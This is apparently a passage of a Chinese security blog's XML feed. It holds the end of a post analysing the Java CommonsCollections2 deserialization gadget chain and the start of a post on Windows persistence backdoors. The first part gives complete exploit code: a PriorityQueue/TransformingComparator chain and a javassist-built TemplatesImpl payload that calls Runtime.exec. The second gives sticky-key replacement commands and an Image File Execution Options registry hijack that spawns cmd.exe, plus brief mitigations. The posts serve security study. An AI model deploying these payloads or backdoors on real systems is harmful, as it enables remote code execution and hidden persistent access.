NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(priorityQueue,transformingComparator);<br>        <span class="hljs-keyword">try</span> &#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./eviltest.bin&quot;</span>));<br>            outputStream.writeObject(priorityQueue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./eviltest.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功执行系统命令弹出计算器。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/6.png"></p><p>​    这时候师傅们有可能会有一个小疑惑：为啥需要向优先级队列添加两个元素呢？</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/7.png"></p><p>这是因为只添加一个元素的话，最终结果会为-1从而无法进入<code>siftDown</code>方法的。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/8.png"></p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/9.png"></p><h2 id="3-进一步完善YSO利用链并写一个Demo"><a href="#3-进一步完善YSO利用链并写一个Demo" class="headerlink" title="3.进一步完善YSO利用链并写一个Demo"></a>3.进一步完善YSO利用链并写一个Demo</h2><p>​    以上我们写的poc虽然可以执行系统命令，但是yso的作者并不是使用该方法。cc2利用链中是利用<code>javasist </code>和 <code>TemplatesImpl</code>，利用字节码来进行执行代码的。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/10.png"></p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/11.png"></p><p>​    我们也尝试使用<code>javasist </code>和 <code>TemplatesImpl</code>这两种技术来构造POC。</p><p>​    我们可以尝试先用<code>javasist</code>生成恶意的恶意字节码，调用<code>TemplatesImpl</code>的<code>newTransformer</code> 从而读取恶意字节码从而进行执行命令。</p><p>​    如下POC是利用<code>javasist</code>生成恶意字节码后，用<code>TemplatesImpl</code>加载该字节码执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">javasistEvil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass =  pool.makeClass(<span class="hljs-string">&quot;EvilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br>        obj.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/12.png"></p><p>​    为了更好的符合实战利用中的要求。可以利用<code>InvokerTransformer</code>触发<code>TemplatesImpl</code>的<code>newTransformer</code> 从而读取恶意字节码从而进行执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">javasistEvil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;<br>        Class clazzs = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);<br>        Constructor constructor = clazzs.getDeclaredConstructor(String.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvokerTransformer transformer = (InvokerTransformer)constructor.newInstance(<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass =  pool.makeClass(<span class="hljs-string">&quot;EvilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        ctClass.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">null</span>);<span class="hljs-comment">//这里和之前利用TemplatesImpl加载恶意字节码有点不同，我下面文章分析</span><br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(transformer);<br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        Class clazz2 = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        Field queues =  clazz2.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queues.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;obj,<span class="hljs-number">1</span>&#125;;<br>        queues.set(priorityQueue,queue_array);<br><br>        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(priorityQueue,transformingComparator);<br>        <span class="hljs-comment">//obj.newTransformer();</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./eviltest1.bin&quot;</span>));<br>            outputStream.writeObject(priorityQueue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;./eviltest1.bin&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/13.png"></p><p>完善的利用链：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                                <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="4-小问题（TemplatesImpl加载字节码的再次分析）"><a href="#4-小问题（TemplatesImpl加载字节码的再次分析）" class="headerlink" title="4.小问题（TemplatesImpl加载字节码的再次分析）"></a>4.小问题（TemplatesImpl加载字节码的再次分析）</h2><p>​    或许师傅会问反射调用<code>TemplatesImpl</code>加载字节码文件不是一定要反射设置如下三个属性吗？为什么<code>_tfactory</code>属性没有设置也成功了。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/15.png">    </p><p>​    利用<code>TemplatesImpl</code>加载字节码时，调用<code>newTransformer</code>会进入<code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code>如下文件的<code>newTransformer</code>方法</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/16.png"></p><p>​    再跟进486行的<code>getTransletInstance</code>方法：</p><p>​    为了触发恶意代码，我们需要进入451行代码中的<code>defineTransletClasses()</code>方法里，所以<code>_name</code>是不能为<code>null</code>的，因此我们反射设置该属性，同时<code>_class</code>是必须为<code>null</code>，因此可以选择反射设置该属性为<code>null</code>或者不设置。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/17.png"></p><p>​    跟进<code>defineTransletClasses()</code>,我们要将<code>_bytecodes</code>设置为我们的恶意字节码。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/18.png"></p><p>​    这里发现<code>_tfactory</code> 已经有值了，因此我们不需要再像一般<code>TemplatesImpl</code>加载字节码一样，用反射为该属性进行赋值了。</p><p>我之前写了一篇关于<a href="https://reader-l.github.io/2021/04/04/Java%E5%AE%89%E5%85%A8-Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%B9%E6%B3%95/#4-%E5%88%A9%E7%94%A8TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">加载字节码的文章</a>师傅们倒是可以去看看。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/19.png"></p><p>​    然后利用<code>defineClass</code>读取字节码，并且赋值给<code>_class</code>，同时在第二个红框处判断是否继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> ，如果继承了就将下标赋值给 <code>_transletIndex</code>。</p><p>这也是我们之所以在用<code>javasist</code>生成类的时候，为什么要加入<code>ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</code>的原因了。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/20.png"></p><p>​    最后回到<code>TemplatesImpl</code>的 <code>getTransletInstance()</code>中在红框处对类进行了初始化，从而触发了我们的恶意代码。</p><p><img src="/2021/04/15/Java%E5%AE%89%E5%85%A8-CommonsCollections2%E5%88%86%E6%9E%90/21.png"></p><h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h1><p>p神的代码审计星球的JAVA安全漫谈的系列文章。</p><p><a href="https://paper.seebug.org/1242/#commonscollections-2">https://paper.seebug.org/1242/#commonscollections-2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前置知识&quot;&gt;&lt;a href=&quot;#1-前置知识&quot; class=&quot;headerlink&quot; title=&quot;1.前置知识&quot;&gt;&lt;/a&gt;1.前置知识&lt;/h1&gt;&lt;p&gt;​    该利用链需要先学习&lt;code&gt;javassist&lt;/code&gt;以及&lt;code&gt;PriorityQu</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网安全学习五-权限维持</title>
    <link href="https://reader-l.github.io/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <id>https://reader-l.github.io/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
    <published>2021-04-14T11:06:16.000Z</published>
    <updated>2021-04-28T14:44:31.961Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>后门（backdoor），在信息安全领域通常是指绕过安全措施获取对程序或系统访问权限的方法。攻击者往往在提升权之后，会通过建立后门来维持对目标主机的控制权。这样一来，即使修复了被攻击者利用的系统漏洞，攻击者还是可以利用后门继续控制目标系统。</p><h1 id="2-操作系统后门"><a href="#2-操作系统后门" class="headerlink" title="2.操作系统后门"></a>2.操作系统后门</h1><p>​    操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证来维持对目标系统的控制及隐匿控制行为的方法。</p><h2 id="1-粘滞键后门"><a href="#1-粘滞键后门" class="headerlink" title="1.粘滞键后门"></a>1.粘滞键后门</h2><p>​    该后门已经流传很久了，操作简单可利用性高。</p><p>​    在正常情况下，我们只要在Windows主机上连续按5此<code>Shift</code>键，就可以调用出粘滞键，实际上是调用<code>windows\system32\sethc.exe</code></p><p>​    而攻击者可以将<code>cmd.exe</code>可执行文件去替换<code>sethc.exe</code>，之后连续按5次<code>Shift</code>键，就会弹出命令行窗口。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1.png"></p><h3 id="1-第一种方法（适用于Windows-Vista版本之前的系统）"><a href="#1-第一种方法（适用于Windows-Vista版本之前的系统）" class="headerlink" title="1.第一种方法（适用于Windows  Vista版本之前的系统）"></a>1.第一种方法（适用于Windows  Vista版本之前的系统）</h3><p>具体命令如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> C:\Windows\System32<br>Move sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak<br>Copy cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><h3 id="2-第二种方法（适用于Windows-Vista版本之后的系统）"><a href="#2-第二种方法（适用于Windows-Vista版本之后的系统）" class="headerlink" title="2.第二种方法（适用于Windows Vista版本之后的系统）"></a>2.第二种方法（适用于Windows Vista版本之后的系统）</h3><p>​    在Windows Vista版本之后的系统，如果使用administrator权限进行修改的话，就会出现如下问题。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/2.png"></p><p>​    因此我们需要对该可执行文件的所有者权限进行修改。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/3.png"></p><p>​    所有者权限进行修改完成后，我们再修改用户对该可执行文件的权限。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/4.png"></p><p>​    以上操作完成后，最后再执行将<code>cmd.exe</code>去替换<code>sethc.exe</code>的操作。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> C:\Windows\System32<br>Move sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak<br>Copy cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p> 之后我们只要按5次粘滞键就可以打开cmd.exe了。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/5.png"></p><h3 id="3-第三种方法（通过修改注册表项）"><a href="#3-第三种方法（通过修改注册表项）" class="headerlink" title="3.第三种方法（通过修改注册表项）"></a>3.第三种方法（通过修改注册表项）</h3><p>​    通过该方法我们并未修改<code>cmd.exe</code>的命名。该技术的核心为修改注册表的映像劫持。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">REG ADD &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\s</span>ethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot;<br></code></pre></td></tr></table></figure><blockquote><p>reg add 是向注册表添加记录，后面跟的是注册表的位置，这里需要注意的是 HKLM 实际上是HKEY_LOCAL_MACHINE 的缩写。Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序，随后通过 / v 来指定键名，这个键名 debugger 是固定的，然后通过 / t 来指定类型，即 REG_SZ 字符串类型，最后通过 / d 来指定键的值，即被恶意替换的程序，也就是我们的 cmd。</p></blockquote><p>操作成功。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/6.png"></p><p>成功弹出cmd.exe</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/7.png"></p><p>一般都是system权限。</p><p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/8.png"></p><h3 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4.解决方法"></a>4.解决方法</h3><p>1.在远程登录服务器时，连续按5此<code>Shift</code>键，判断服务器是否被入侵。</p><p>2.拒绝使用<code>sethc.exe</code>或者在”控制面板”中关闭”启用粘滞键”选项。</p><h2 id="2-注册表注入后门"><a href="#2-注册表注入后门" class="headerlink" title="2.注册表注入后门"></a>2.注册表注入后门</h2><h3 id="1-利用当前用户的运行键"><a href="#1-利用当前用户的运行键" class="headerlink" title="1.利用当前用户的运行键"></a>1.利用当前用户的运行键</h3><p>命令如下：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 